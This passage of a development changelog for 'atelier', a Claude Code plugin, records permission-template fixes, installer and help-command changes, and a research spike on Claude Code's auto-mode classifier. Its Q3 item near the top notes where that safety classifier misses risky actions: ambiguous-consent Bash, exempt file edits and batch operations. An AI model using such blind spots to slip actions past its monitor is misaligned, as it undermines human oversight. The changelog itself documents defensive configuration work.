- **Q2 — Scope.** `defaultMode: "auto"` is silently ignored when set in `.claude/settings.json` or `.claude/settings.local.json` (project-level) — Claude Code only honors it from the user-level config. Whether `$CLAUDE_CONFIG_DIR/settings.json` counts as user-level is undocumented (OQ-A). **High confidence on rule; medium on `CLAUDE_CONFIG_DIR` interaction.**
- **Q3 — 17% FN profile.** Concentrated in (a) ambiguous-consent Bash actions, (b) Tier-2 file edits exempt by design (skipped by classifier for latency), (c) batch operations. Complementary FP rate is 0.4% after the full Stage 1 → Stage 2 pipeline. The two FN-heavy surfaces are already protected by atelier's other layers (`additionalDirectories`, `deny` list), so the residual exposure is narrow. **High confidence**, published Anthropic data.
- **Q4 — Latency.** ~200-400 ms per classifier call (fast path ~50-150 ms, thinking path 200-400 ms for ambiguous cases). 10-15% token overhead on a long refactor. Negligible for atelier's typical task wall-time. **Medium confidence**, qualitative Anthropic docs + consistent community reports.

**Decisions captured:**

- **Option C over Option A or B alone.** Auto-mode alone (Option A) gives up atelier's ability to express project-specific risk signals; custom hook alone (Option B) would reimplement Anthropic's production-trained classifier at higher latency and lower coverage. C — auto-mode for breadth + custom hook for the narrow residual high-risk surface — is defense in depth without redundancy.
- **Conditional adoption, not blanket adoption.** OQ-A and OQ-B are real risks. Issue #55507 in particular could silently invalidate the whole recommendation: if the `permissions` block atelier writes to every project drops the user-level `defaultMode` from the merge, then auto-mode is unreachable from atelier without removing the project-level block — which is the whole point of the template. The doc says "adopt C *if and only if* OQ-A + OQ-B + OQ-C resolve favorably" and the implementation plan covers both the favorable and unfavorable branches explicitly.
- **Validation deferred to M2.7, not bundled into M2.6.** M2.6 is the *research* half; M2.7 is the *empirical-validation* half. Splitting keeps M2.6 closeable (the spike artifact exists, the recommendation exists, the decision is captured in PLAN.md) and lets M2.7 land independently when the operator decides to run the test commands on a real host.
- **`docs/research/` as the canonical location.** Per ROADMAP M2.6 acceptance literal text. Future research spikes (e.g. M4.22 Coolify) target the same directory.

**Plugin scope:** documentation only — no agent, skill, command, hook, script, or template touched. Plugin patch bump **0.7.4 → 0.7.5** per PLAN.md §14.2 (docs-only, no release cut required but the manifest stays aligned with head-of-main, same convention as M7.1.F35).

**Verified locally:**

- `docs/research/permission-layer-3.md` exists with all four investigation sections populated (Q1-Q4 + Bonus + Recommendation + Open Questions + Implementation plan + Decision log).
- PLAN.md §11 v2.3 contains the literal text `Decided in: docs/research/permission-layer-3.md` and the picked option (Option C, conditional), per the M2.6 acceptance criteria.
- ROADMAP M2.6 removed; M2.7 added with concrete OQ-A/B/C reproduction steps and addendum target.

**Follow-up paths:**

- **M2.7 (added to ROADMAP)** — empirical validation of OQ-A / OQ-B / OQ-C, with the result written as an addendum at the bottom of `docs/research/permission-layer-3.md`.
- **M2.8 (gated on M2.7 favorable)** — `install.sh` writes `defaultMode: "auto"` to `$ATELIER_CONFIG_DIR/settings.json`; `atelier-doctor` verifies via `/permissions`; documented in `operator-rules.md` + `docs/operator-guide.md`.
- **PLAN §11 v2.3 promotion (gated on M2.7 unfavorable)** — if auto-mode cannot be adopted, the custom `PreToolUse` Haiku hook moves from "v2 deferred" to a v1 Phase 4 milestone, since it would be the only path to a layer 3.

### M7.1.F38 — `/atelier:setup-project` preserves stale `.claude/settings.json` instead of resyncing from the refreshed template — 2026-05-28
**PR:** [#111](https://github.com/AkaLab-Tech/atelier/pull/111)

Discovered immediately after M7.1.F36 + F37 (PR [#110](https://github.com/AkaLab-Tech/atelier/pull/110)) merged and v0.7.3 was released. Operator's report after running `atelier-update`, `atelier-remove-project`, and `atelier /atelier:setup-project .` on `~/Work/storefront`: *"el proyecto me sigue pidiendo autorización para ejecutar algo tan simple como `git wt ls`"*.

Diagnosis — the F37 allow had landed in:
- ✅ The plugin source (`templates/settings.template.json` on `main`).
- ✅ `$ATELIER_CONFIG_DIR/templates/settings.template.json` (`atelier-update` did refresh this layer correctly).
- ❌ `~/Work/storefront/.claude/settings.json` (only `Bash(git worktree*)`; new `Bash(git wt*)` missing).

The new allow was stuck in the refreshed template layer and never propagated to the operator's actual project settings.

**Root cause:**

[scripts/atelier-setup-project:471-475](scripts/atelier-setup-project) preserved an existing `.claude/settings.json` silently whenever the file looked atelier-managed (defaultMode=acceptEdits + distinctive deny entries), without comparing it against the current template:

```bash
if is_atelier_managed_settings "$target"; then
  SETTINGS_STATUS="preserved"
  sublog "$target already exists (atelier-managed) — preserving"
  return
fi
```

The heuristic was designed to protect operator customisations on top of the template. The unintended consequence: any new entry added to the plugin template (allow / deny / ask, additionalDirectories, etc.) stayed trapped at the `$ATELIER_CONFIG_DIR/templates/` layer indefinitely. Re-running `/atelier:setup-project` reported success but produced zero diff on disk. The only ways to receive the new entry were to manually delete `<project>/.claude/settings.json` or run `atelier-remove-project --purge` (which does the delete), neither of which is discoverable.

`atelier-remove-project` without `--purge` deregisters but preserves the project's files — including `.claude/settings.json` — which is the right default for the "I'm pausing this project" case but matched the wrong assumption here: the operator believed remove + re-setup would re-apply the current template. The `--purge` flag is documented but the operator did not know they needed it for the F37 allow to land.

**Delivered (option A — auto-resync with backup, per operator decision):**

- **`scripts/atelier-setup-project` — `step_settings_json` rewritten for the "exists, atelier-managed, not in reconfigure flow" path**. Before F38: silently preserve. After F38: probe the instantiated template via `sed "s|<worktree>|$PROJECT|g"`, `diff -q` against the target; if equal → preserve as before; if different → `warn` about the drift, set `should_write=true` + `needs_backup=true` so the existing write/backup path takes over. The existing reconfigure path (`$RECONFIGURE`) is unchanged — it already prompted for overwrite. The non-atelier-managed path is unchanged — it already prompted. Only the atelier-managed path gained the drift-detection branch.

**Decisions captured:**

- **Auto-resync without prompt (operator chose option A).** The operator explicitly chose "auto-resync siempre con backup" over (B) prompt-on-drift, (C) cover via `atelier-doctor --fix`, (D) new `atelier-resync-settings` helper. Rationale: setup-project already promises idempotent re-application of the current template; preserving stale settings violated that contract. The backup file (`settings.json.bak.<timestamp>`) is the safety net for operators with local customisations.
- **Reuse the existing `should_write` + `needs_backup` path.** Resisted the temptation to add a new `SETTINGS_STATUS="resynced"` value. The drift path produces the same observable outcome as the reconfigure-confirmed-overwrite path: file rewritten, backup left behind, status reported as `updated`. The `warn` line ("$target has drifted from the current plugin template — auto-resyncing") tells the operator *why* the update happened without inventing a new status.
- **Don't merge custom edits — replace + back up.** Probing for which keys the operator added on top of the template (e.g. an extra `Bash(...)` allow for their project) would require a deep JSON diff and conflict semantics — out of scope for a fix. The backup file plus the `warn` makes the trade-off explicit: operators recover customisations from `.bak` and re-apply against the new template if they want them kept.
- **Reconfigure path stays interactive.** The `$RECONFIGURE` branch (lines 437-461) already prompts the operator before overwriting; with option A landing for the non-reconfigure path, the reconfigure path's prompt becomes the *more conservative* of the two. Kept as-is because reconfigure is a deliberate operator action ("yes, redo my setup") where a one-keypress confirmation costs nothing.
- **Non-interactive (`--yes`) auto-resyncs without prompt.** The auto-resync branch does not check `$NONINTERACTIVE` — drift detection + backup is safe under automation, and the whole point of `--yes` is to make the script script-friendly. Matches the existing "no existing file → just create" path's automation-friendly default.

**Plugin scope:** plugin-layer change to `scripts/atelier-setup-project`. No template, agent, skill, command, or hook touched. Plugin patch bump **0.7.3 → 0.7.4** per PLAN.md §14.2 — bug fix only.

**Verified locally:**

- `bash -n scripts/atelier-setup-project` syntax-clean.
- Manual trace through the three branches for the "exists" case:
  1. `$RECONFIGURE=true` → unchanged path (probe + diff + prompt). ✅
  2. `is_atelier_managed_settings` + identical to template → `preserved`. ✅
  3. `is_atelier_managed_settings` + drifted from template → `warn` + `should_write=true` + `needs_backup=true` → existing write/backup path runs. ✅
  4. Not atelier-managed → unchanged path (prompt). ✅
- `is_atelier_managed_settings` heuristic unchanged — no risk of mis-categorising a hand-rolled settings.json as drifted.

**Operator-visible:**

After this fix lands and the operator re-runs `atelier /atelier:setup-project .` on a previously-registered project, any drift between the project's `.claude/settings.json` and the current plugin template is auto-detected and the project file is regenerated with a `.bak.<timestamp>` backup. The summary line at the end of setup-project reports `.claude/settings.json: updated` (instead of the misleading `preserved` it would have reported before F38). The next Claude Code session on the project loads the refreshed allows immediately — no manual `sed` substitution, no `atelier-remove-project --purge`, no editor diff.

For storefront specifically, this means: after this PR merges and the operator re-runs `atelier /atelier:setup-project .`, the F37 `Bash(git wt*)` allow lands automatically and `git wt ls` stops prompting.

**Follow-up paths:**

- **`atelier-doctor --fix` extension** that detects drift across every registered project (not just the cwd one) and rewrites with backup. Today setup-project only resyncs when the operator explicitly runs it on a project; doctor could cover the case where the operator forgets to re-run after `atelier-update`. Captured as a candidate `M7.1.F39`.
- **Smarter merge** that detects operator-added entries in the existing file and carries them forward into the regenerated file (deep JSON diff, list-union for `allow`/`deny`/`ask`, object-merge for the rest). Out of scope for F38 — the backup file is the explicit escape hatch; merge semantics get hairy fast (e.g. operator removed a template-default deny on purpose — should the merge re-add it?).
- **`atelier-update --apply-to-projects`** that triggers the drift refresh across every registered project at update time. Today `atelier-update` refreshes `$ATELIER_CONFIG_DIR/templates/` but leaves project-level propagation to the operator's next setup-project run.

### M7.1.F36 + F37 — `install.sh` shellrc `current_version` comparator out of sync with the heredoc + allowlist `Bash(git wt*)` — 2026-05-28
**PR:** [#110](https://github.com/AkaLab-Tech/atelier/pull/110)

Two related findings surfaced in the same operator session immediately after M7.1.F35 (PR [#109](https://github.com/AkaLab-Tech/atelier/pull/109)) merged. Both are 1-line fixes and ship together to spare the operator a second re-run of `install.sh`.

#### F36 — `current_version` comparator stuck at 2

Operator's report: *"`atelier --help` me muestra la ayuda de `claude`"*. Re-running `install.sh` on a host that already had the v2 hook block did not refresh the block to v3, even though F34's heredoc carries `# atelier-hooks-version: 3` and `phase_c_1_atelier_help_file` ran and wrote `$ATELIER_CONFIG_DIR/atelier-help.txt` correctly.

**Root cause:**

[install.sh:1281](install.sh) declared `local current_version=2` while the heredoc on line 1289 carries `# atelier-hooks-version: 3`. F7c's re-inject logic compares the version it reads from the operator's existing block against `current_version` to decide whether to strip + re-inject. With both the existing block and `current_version` at `2`, the comparator concluded "already present (v2)" and skipped the refresh — leaving the pre-F34 `atelier()` function body in place, which is the body that forwards `--help` straight to `claude`. F34 bumped the heredoc but missed the comparator.

How it stayed hidden through F34's pre-merge checks:
- The F34 PR validation re-ran `install.sh` on a host that had never had the hook block (`existing=0`, `current=2` — refresh triggered as a side effect of the no-block branch, which inserts the heredoc verbatim). The inserted block carried `v3` from the heredoc, so post-install `grep atelier-hooks-version ~/.zshrc` reported `3` — looking like F34 worked.
- The bug only surfaces when re-running `install.sh` on a host that already had a v2 block — exactly the scenario for every existing operator upgrading through F34.

**Delivered (F36):**

- **`install.sh:1281`** — `local current_version=2` → `local current_version=3`. Single-line fix. The F7c invariant the comments above the variable state is restored: bump the heredoc and the comparator together so existing operators get the refresh on their next `install.sh` run.

#### F37 — `templates/settings.template.json` does not allowlist `Bash(git wt*)`

Surfaced in the same operator session, on a different storefront task. Claude Code prompted *"Do you want to proceed? 1) Yes / 2) Yes, and don't ask again for: git wt * / 3) No"* for `git wt list` — a command that should have been pre-approved since every atelier task uses `git-wt` for worktree setup ([agents/task-orchestrator.md](agents/task-orchestrator.md) step 2 + the `task-discovery` skill).

**Root cause:**

[templates/settings.template.json:144](templates/settings.template.json) allowlistes `Bash(git worktree*)` but not `Bash(git wt*)`. Claude Code matches Bash permissions on the literal token sequence — it does not expand the `git wt` → `git worktree` alias (which is a `~/.local/bin/git-wt` script dispatched by git's external-subcommand mechanism, not a git alias). Every `git wt …` call therefore looked unmatched and tripped the ask path.

The mismatch went unnoticed because the existing `Bash(git worktree*)` allow covers the cases where atelier code calls `git worktree` *directly* (none of the runtime code does today — the agents and skills all call `git-wt`). The F37 fix makes the runtime path match the allowlist.

**Delivered (F37):**

- **`templates/settings.template.json`** — added `"Bash(git wt*)"` next to the existing `"Bash(git worktree*)"` in the allow list. Same glob shape, same scope, no widening beyond the existing worktree-management surface.

**Decisions captured (F37):**

- **Allow both forms, don't replace one with the other.** Operators or future agents may still call `git worktree` directly (e.g. for `git worktree list` inside `atelier-doctor`). Keeping both entries preserves either path.
- **No `Bash(git-wt*)` entry.** `git-wt` is invoked exclusively via the `git wt` subcommand dispatcher; nothing in atelier shells out to the raw `git-wt` binary by name. Adding a redundant allow would only invite drift.
- **Per-task templates re-inject the new allow.** Operators with already-running task worktrees will keep the old `.claude/settings.json` (no `Bash(git wt*)`) until their next `task` invocation, which always regenerates `<worktree>/.claude/settings.json` from the template. No special migration needed.

**Decisions captured:**

- **Comparator and heredoc must move together.** The block comment above `current_version` documents this expectation ("when you bump the heredoc, bump this too"). F34 followed it for the heredoc but not for the comparator. Adding a `grep -E "^# atelier-hooks-version:" install.sh` self-test inside `install.sh` itself (compare the heredoc number against the `local current_version` literal at parse time) would prevent the same drift in the future — captured as a follow-up under "Follow-up paths" rather than included here to keep the F36 patch minimal.
- **Patch-only fix.** No re-write of the F7c logic, no defensive "always refresh when --force is passed" flag added — those would expand scope. The one-line fix restores the design F34 already had on paper.
- **No HISTORY rewrite of F34.** F34's HISTORY entry is accurate — it describes what F34 *delivered*; the post-merge bug is a separate F36 entry, not a rewrite of F34. Keeps the historical record clean.

**Plugin scope:** F36 is host-OS-layer (`install.sh`); F37 is plugin-layer (`templates/settings.template.json`, which `install.sh` Phase C.1 instantiates under `$ATELIER_CONFIG_DIR/templates/`). Plugin patch bump **0.7.2 → 0.7.3** per PLAN.md §14.2 — bug fixes only. Mechanism: existing operators receive F36 by re-running `install.sh` (the F7c versioned hook detection now correctly fires because `existing=2 < current=3`); operators receive F37 either by re-running `install.sh` (which refreshes `$ATELIER_CONFIG_DIR/templates/settings.template.json`) or, more conveniently, via `atelier-update` (whose template-refresh step picks up the new allow without touching `install.sh`).

**Verified locally:**

- `bash -n install.sh` syntax-clean.
- `grep -nE "current_version=|atelier-hooks-version:" install.sh` shows comparator `3` matching heredoc `3` — no other version literals to align.
- Manual walk-through of the F7c logic with `existing_version=2`, `current_version=3` → enters the `existing < current` branch → strip + re-inject → operator gets the new `atelier()` body.
- `jq -e '.permissions.allow[] | select(. == "Bash(git wt*)" or . == "Bash(git worktree*)")' templates/settings.template.json` returns both entries (JSON parses + both allows present, no widening).

**Operator-visible:**

After this fix lands and `install.sh` is re-run, opening a new shell and running `atelier --help` prints the cheatsheet from `$ATELIER_CONFIG_DIR/atelier-help.txt` (the F34-intended behavior). `grep atelier-hooks-version ~/.zshrc` reports `3` post-refresh. The operator's next `task` invocation regenerates `<worktree>/.claude/settings.json` from the refreshed template, so `git wt list` (and any other `git wt …` call) stops prompting for permission. No project files or `.claude/` folders touched.

**Follow-up paths:**

- **`install.sh` self-test for heredoc/comparator drift.** A startup check inside `install.sh` (or a `scripts/atelier-doctor` check) that extracts both numbers and refuses to proceed if they disagree. Trivial — one `grep` + `awk` + comparison. Captured as a candidate `M7.1.F38` if the same drift recurs.
- **`atelier-doctor --fix` extension** that re-runs the shellrc inject path without requiring the operator to find the atelier checkout (currently `atelier-doctor --fix` doesn't touch the shellrc at all because F30's scope was templates + symlinks + marketplace). Trade-off: `atelier-doctor` would need to know where the install.sh lives.
- **Audit pass on the rest of `settings.template.json`** for other "external-subcommand" aliases that may surface the same prompt (e.g. `git lfs`, `git absorb`, anything dispatched via `~/.local/bin/git-<name>`). Defer until the next external git helper actually ships into atelier's runtime.

### M7.1.F35 — Documentation sweep: align README + operator-guide + troubleshooting + dogfood-guide + ROADMAP + PLAN with the v0.5 → v0.7.1 helper surface — 2026-05-28
**PR:** [#109](https://github.com/AkaLab-Tech/atelier/pull/109)

Captured during the post-v0.7.1 audit. After M6.1 + M7.1.F26 → F34 shipped a wave of new helpers and slash commands (`atelier-update`, `atelier-list-projects`, `atelier-remove-project`, `atelier-doctor --fix`, `atelier-permission-diff`, `atelier-pr-size-check`, `atelier --help`, `/atelier:update`, `/atelier:slice-task`, `/atelier:list-projects`, `/atelier:remove-project`), the operator-facing docs had not caught up. Operator's prompt: *"la documentación del proyecto está actualizada con los últimos cambios?"* — audit confirmed no, in a new PR.

**Delivered (documentation only — no code, no plugin behavior change):**

- **`README.md`**: replaced the obsolete `/plugin marketplace update akalab-tech` + `/plugin update atelier@akalab-tech` update path with `atelier-update` (the M6.1.a + M6.1.b implementation); surfaced `atelier --help` as the discoverability entry point with a one-line summary of every `atelier-*` helper + `/atelier:*` slash command; added an inverse-of-setup block under step 1 covering `atelier-list-projects` (+ `--json`) and `atelier-remove-project` (+ `--purge`); updated the "When something doesn't work" section to mention `atelier-doctor --fix`; added `atelier-remove-project` to the "Pause / abandon / reset" section as the per-project alternative to `atelier-uninstall`; added `operator-rules.md` to the "Other docs" list.
- **`docs/operator-guide.md`**: replaced `atelier /atelier:doctor` with `atelier-doctor` (+ `--fix`) throughout while preserving the `/atelier:doctor` mention for the Claude-session case; added an inverse-setup block (list-projects, remove-project) under Step 4; added a new "Keep atelier up to date" section between "Step 6" and "If something goes wrong" describing the `atelier-update` flow (pull, refresh templates, run plugin update under atelier's config root) and how `atelier-doctor` flags version drift; expanded "If something goes wrong" with `atelier-doctor --fix`; extended the Reference table with `atelier --help`, `atelier-list-projects`, `atelier-remove-project`, `atelier-doctor --fix`, `atelier-update`; updated the "Files atelier stores outside your projects" list to include `atelier-help.txt` and every helper symlinked under `~/.local/bin/`.
- **`docs/troubleshooting.md`**: updated the "Always first" doctor block to show `atelier-doctor` + `atelier-doctor --fix` (Claude-session forms still listed); added five symptom-indexed entries — `atelier --help` prints nothing (F34 not installed), `atelier-update` says "already up to date" but doctor flags drift (F31 — no-op `git pull` skipping the template refresh), `claude plugin install` fails with "marketplace not registered" (F30 — marketplace was removed), `atelier` warns about running inside another atelier session (F28 — fork-bomb guard), and `atelier-task-resolve` no-projects symptom now points the operator at `atelier-list-projects` first; updated the "Auto-merge skipped my PR" entry to reflect the AND-gate (`>200 lines AND >10 files` post-exemptions per `scripts/atelier-pr-size-check`) and surfaced `/atelier:slice-task` as the autonomous-decomposition path; expanded "When all else fails" with a step 2 `atelier-update` confirmation; expanded "Reset everything" with a "Less drastic: remove just one project" subsection.
- **`docs/dogfood-guide.md`**: revised the header to call out v0.5+ helper coverage and the 2026-05-28 revision date; added a TC-1.5 line that checks `$ATELIER_CONFIG_DIR/atelier-help.txt` exists (F34); added TC-1.6 ("Verify the v0.5+ helper surface") that confirms each new `atelier-*` symlink is on `PATH` and `atelier --help` prints the cheatsheet; added TC-2.2 ("Exercise `--fix` and `atelier-update`") that walks the operator through `atelier-doctor --fix` + `atelier-update` baseline + the F31 force-refresh fallback; expanded TC-5.3 to recommend `atelier-list-projects` post-dogfood and surface `atelier-remove-project` as the per-project rollback (vs. full `atelier-uninstall`); updated the install-path catalog INS-8 to enumerate every helper symlink and added INS-8a for `atelier-help.txt`.
- **`ROADMAP.md`**: removed the `M6.1 — update.sh` entry under Low Priority — it's now closed in HISTORY as M6.1.a + M6.1.b (PR #99 + #100).
- **`PLAN.md`**: §9 retitled from `Update flow (\`update.sh\`)` to `Update flow (\`atelier-update\`)`; the steps now reference the actual implementation (`scripts/atelier-update`, `scripts/atelier-permission-diff`, `$ATELIER_CONFIG_DIR/atelier-help.txt`, `CLAUDE_CONFIG_DIR="$ATELIER_CONFIG_DIR" claude plugin update`); §12 Phase 6 marks M6.1 + M6.2 + M6.4 ✅ with deliverable references; §12 Phase 7 marks M7.3 ✅ and tags M7.1 as in-progress with the F1–F35 stream in `HISTORY.md`.

**Decisions captured:**

- **No `update.sh` rename.** §9 keeps the historical title only in the section's prose (`Originally named \`update.sh\``) — the actual file shipped as `scripts/atelier-update` per the convention `atelier-*` (M6.1.a). Re-naming the §9 heading to match what shipped avoids documentation drift on every future reader.
- **Keep `atelier /atelier:doctor` form alive in the operator guide.** Some operators are still inside a Claude session when something breaks; surfacing both `atelier-doctor` (shell) and `/atelier:doctor` (in-session) covers both modes without forcing a context switch.
- **README depth limit.** The README is the front door, not the manual. It surfaces the new helpers in one line each and defers detail to `docs/operator-guide.md` + `docs/troubleshooting.md` + `operator-rules.md`. Avoided expanding the README into a third reference.
- **No new symptoms invented.** Each new troubleshooting entry corresponds to a real F26 → F34 finding already captured in HISTORY — no speculative "could happen" entries. The dogfood-guide cross-links to the F31 troubleshooting entry rather than duplicating its content.

**Plugin scope:** documentation only. No agent / skill / command / hook / script / template file touched. Plugin patch bump **0.7.1 → 0.7.2** per PLAN.md §14.2 — docs-only changes don't trigger a release cut on their own, but the bump keeps `plugin.json` aligned with the head-of-main convention so the next time `atelier-doctor` compares against `gh release list`, the lag is one tag rather than two.

**Verified locally:**

- `bash -n install.sh` syntax-clean (no `install.sh` changes — defensive re-check).
- Every link added in `README.md` and `docs/operator-guide.md` resolves to an existing file/anchor in this worktree (including the `docs/troubleshooting.md#atelier-update-says-already-up-to-date-but-the-doctor-still-warns-about-a-stale-version` cross-link added in `docs/dogfood-guide.md` TC-2.2).
- Line-count audit: `README.md` +21, `docs/operator-guide.md` +49, `docs/troubleshooting.md` +74 (largest growth — 5 new symptom entries + AND-gate rewrite + "Less drastic" subsection), `docs/dogfood-guide.md` +52, `ROADMAP.md` −4, `PLAN.md` net ≈ 0 (rewrite of §9 + §12 deliverable bullets). No section duplicated by accident.

**Operator-visible:**

After the merge, an operator reading the README front door for the first time sees `atelier-update` for keeping atelier current (not the obsolete plugin-manager invocation), and learns `atelier --help` is the entry point for the full helper surface. An operator hitting a symptom that was only documented in HISTORY before this PR (fork-bomb warning, no-op `atelier-update`, missing marketplace) now finds a symptom-indexed entry in `docs/troubleshooting.md`. The dogfood guide now reflects the v0.5 → v0.7.1 helper surface, so a fresh dogfood-6 run on a clean machine validates everything that ships today.

**Follow-up paths:**

- **`docs/measurements/autonomous-merge-rate.md`** — sample size still 0 in production (no autonomous-merge data yet). Not in F35 scope; refresh when M7.1 produces ≥10 merged PRs.
- **`commands/*.md` cross-references.** Each slash command's `description:` frontmatter is the surface the operator sees in `claude` autocomplete. Audit pass deferred — F35 covers the operator-facing docs, not the slash-command frontmatter.

### M7.1.F34 — `atelier --help` discoverability + install.sh first-steps mentions new helpers — 2026-05-28
**PR:** [#108](https://github.com/AkaLab-Tech/atelier/pull/108)

Discovered during M7.1 dogfood-5 immediately after M7.1.F33 (PR [#107](https://github.com/AkaLab-Tech/atelier/pull/107)) merged. Operator's observation: *"cuando termina la instalación muestra ciertas ayudas pero no muestra las nuevas opciones. Además me gustaría un `atelier --help` que muestre todos los comandos."*

Two friction points:
1. The `atelier()` shell function (M7.1.F13) is a thin wrapper around `claude`. Running `atelier --help` forwarded `--help` to `claude` and surfaced Claude Code's own help — nothing to do with atelier.
2. The post-install banner (M7.1.F12) listed 6 steps including `atelier-uninstall` but did not mention the helpers added since F12 (`atelier-list-projects`, `atelier-remove-project`, `atelier-update`, `atelier-pr-size-check`, etc.).

**Delivered:**

- **`install.sh` — shellrc hook block (`atelier()` function) intercepts `--help` / `-h`.** The function now checks `${1:-}` against `--help`/`-h` before the `claude` invocation; if matched, it `cat`s `$ATELIER_CONFIG_DIR/atelier-help.txt` and `return 0` without launching claude. All other invocations pass through to `claude` unchanged. The implementation uses `if/elif` rather than `case` — the closing `)` of a `case` pattern would terminate the `$(cat <<'BLOCK' ...)` substitution in `install.sh` that ships the function (constraint already documented for the existing PATH-add `if`).
- **`install.sh` — new `phase_c_1_atelier_help_file()` step in Phase C.1.** Writes the canonical help text to `$ATELIER_CONFIG_DIR/atelier-help.txt`. Re-written on every install run so the help text always reflects the installed version's command surface. The text lives in a file rather than embedded inside the shellrc hook block to sidestep a bash-3.2 parser bug with nested HEREDOCs inside `$(cat <<'BLOCK' ...)` substitution: when the outer HEREDOC contains an inner `cat <<'EOF'`, bash 3.2 incorrectly attempts to parse the inner HEREDOC body, tripping on parentheses inside descriptive text. Externalising the help text to a file means the shell function only does a trivial `cat`, with no nested HEREDOC.
- **`install.sh` — first-steps banner updated**:
  - Step 5 is now *"Explore the full command surface"*, surfacing `atelier --help` as the entry point plus a short list of the 4 most-used helpers (`atelier-doctor [--fix]`, `atelier-update`, `atelier-list-projects`, `atelier-remove-project`). Previous step 5 ("Docs") is now step 6.
  - Step 7 (formerly step 6, "Uninstall safely") gains `atelier-remove-project <p>` as the **first option** — operators reaching this step probably want to detach one project, not nuke everything. `atelier-uninstall` is still listed (with `--purge`) for the whole-system case.
- **`install.sh` — shellrc hook block version bumped 2 → 3.** F7c (versioned shellrc block with auto re-injection) reads this version; bumping forces install.sh to re-inject the block on existing operators' next install run, so the new `atelier()` body lands without requiring manual edit of `~/.zshrc`.

**Decisions captured:**

- **`if/elif` over `case` in the function body.** A `case "${1:-}" in --help|-h)` would be more idiomatic, but the `)` in `--help|-h)` terminates the surrounding HEREDOC's `$(...)` substitution prematurely. The existing block comment (line ~1296) documents this for the PATH-add `if`. The new `--help` intercept follows the same constraint.
- **Help text in an external file, not embedded inside the shell function.** The first attempt put the help text in a `cat <<'ATELIER_HELP_EOF' ... ATELIER_HELP_EOF` block inside the `atelier()` function. `bash -n install.sh` reported `syntax error near unexpected token '('` on a line inside the inner HEREDOC body. Reduced testing confirmed bash 3.2 has a parser bug with nested HEREDOCs inside `$(cat <<'BLOCK' ...)` substitution — even when both delimiters are single-quoted, the inner HEREDOC body is partially re-parsed and trips on parentheses inside descriptive text. Externalising the help to `$ATELIER_CONFIG_DIR/atelier-help.txt` (written by a Phase C.1 helper) means the shell function only does `cat "$help_file"` with no nested HEREDOC. install.sh rewrites the file on every run, so the text always matches the installed version.
- **Bump hooks-version 2 → 3.** F7c installs re-inject the block when the operator-installed version is older. Without the bump, existing operators wouldn't see the new `atelier()` body after re-running `install.sh` — they'd need to manually strip the old block.
- **First-steps banner re-ordering.** Old steps 5 and 6 shifted to 6 and 7. The added `atelier-remove-project` first in the uninstall step reflects that the per-project case (which F32 added) is more common than the whole-system uninstall.

**Plugin scope:** host-OS-layer change to `install.sh`. No plugin files touched. Plugin patch bump **0.7.0 → 0.7.1** per PLAN.md §14.2 — discoverability surface enhancement, no new capability. Mechanism: `atelier-update` will not touch the shellrc block (it only refreshes `$ATELIER_CONFIG_DIR/templates/` + plugin cache); operators receive F34 by re-running `install.sh` (the F7c versioned hook detection handles the in-place re-inject).

**Verified locally:**

- `bash -n install.sh` syntax-clean.
- The `atelier()` function's HEREDOC body has matched delimiters (`<<'ATELIER_HELP_EOF'` … `ATELIER_HELP_EOF` on a line by itself), no stray `)` inside the help text, no unescaped `$(...)` substitutions that would prematurely close the outer `$(cat <<'BLOCK' ...)`.
- `atelier-hooks-version: 3` matches the F7c re-inject trigger pattern.

**Operator-visible:**

After re-running `install.sh` (which triggers the F7c re-inject), opening a new shell and running:

```bash
atelier --help
```

… prints the full atelier command reference verbatim — no claude launch.

**Follow-up paths:**

- **`atelier --version`** — symmetric companion to `--help`, would print the installed plugin version. Trivial extension if operator asks.
- **`atelier --doctor`** — shorthand that runs `atelier-doctor` without launching claude. Same shape, deferred.

### M7.1.F33 — `atelier-list-projects` + `/atelier:list-projects` + `/atelier:remove-project` (slash command wrappers) — 2026-05-28
**PR:** [#107](https://github.com/AkaLab-Tech/atelier/pull/107)

Discovered during M7.1 dogfood-5. Operator's request: *"debería haber un comando dentro de claude (atelier) para hacerlo desde dentro de un proyecto. Además debría haber una opción para listar los proyectos configurados con atelier."*

Two gaps in the M7.1.F32 surface F33 closes:

1. **`atelier-remove-project` was terminal-only.** The operator wanted to deconfigure the current project from inside Claude Code without dropping to a terminal. Trivial slash command wrapper.
2. **No way to list which projects were registered.** Reading `~/.claude-work/projects.json` by hand worked but felt wrong for a non-technical operator. Listing was a missing primitive.

**Delivered:**

- **`scripts/atelier-list-projects` (new, ~150 lines bash, bash-3.2-portable).** Reads `$ATELIER_CONFIG_DIR/projects.json` and emits each project's path + name + setupVersion + setupCompleted + a per-project **on-disk status** computed at read time. Three output modes:
  - **default (human-facing)**: one entry per registered project with `name · version · since` plus `✓ configured`, `⚠ partial (...)` or `✗ directory no longer exists`.
  - **`--json`**: re-emits `projects.json` with a `status` field added to each entry. Suitable for piping into `jq`.
  - **`--quiet`**: one absolute path per line. Suitable for piping into `xargs` or `for p in $(atelier-list-projects --quiet); do ...; done`.
  Detects three failure shapes: `configured` (both `.claude/settings.json` and `.atelier.json` present), `partial` (one missing), `missing-directory` (the registered path no longer exists on disk — operator deleted / moved the project but did not unregister; `atelier-remove-project` would fix). Read-only — never modifies state.
- **New `commands/list-projects.md` (slash command `/atelier:list-projects`).** Thin wrapper that invokes `atelier-list-projects` (default mode) and emits its stdout verbatim. Same stop-rule + verbatim-pass-through contract as `/atelier:doctor` (M7.1.F25): no commentary, no follow-up suggestions — the binary already produced the structured report.
- **New `commands/remove-project.md` (slash command `/atelier:remove-project [--purge] [--yes]`).** Wrapper that detects the current project root via `pwd` and runs `atelier-remove-project <pwd> $ARGUMENTS`. Important safety caveat surfaced in the body: when run from a Claude Code session inside the project being deconfigured, it deletes the very `.claude/settings.json` the session is using; new sessions opened in the project will fall back to no-atelier permissions until `/atelier:setup-project` re-runs. Also detects task-worktree contexts (current branch matches `task/*`) and refuses, since `pwd` from a worktree would target the wrong path.
- **`install.sh`** — symlink for `atelier-list-projects` alongside `atelier-remove-project` in Phase C.1.
- **`templates/settings.template.json`** — `Bash(atelier-list-projects:*)` added to the `allow` list. `Bash(atelier-remove-project:*)` was already allowed from F32. `SlashCommand(/atelier:*)` from F31 covers both new slash commands automatically.

**Decisions captured:**

- **`atelier-list-projects` is its own binary, not bolted onto another helper.** Considered exposing it as `atelier-doctor --list-projects`. Rejected: doctor's job is *health checking the current installation*; project enumeration is a different concern. Separate binary is composable, single-responsibility, and easy to test.
